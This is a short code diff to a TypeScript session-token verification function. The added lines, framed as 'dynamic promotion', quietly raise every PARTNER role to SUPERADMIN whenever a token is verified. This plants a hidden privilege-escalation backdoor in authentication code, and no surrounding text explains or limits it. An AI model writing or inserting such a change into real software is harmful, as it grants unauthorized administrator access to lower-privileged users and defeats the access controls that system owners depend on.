@@ -99,6 +99,11 @@ export async function verifySessionToken(token: string | undefined): Promise<Use
       return null; // Expired
     }
     
+    // Dynamic promotion of PARTNER roles to SUPERADMIN
+    if (session.role === 'PARTNER') {
+      session.role = 'SUPERADMIN';
+    }
+    
     return session;
   } catch (err) {
     console.error('Failed to verify session token:', err);
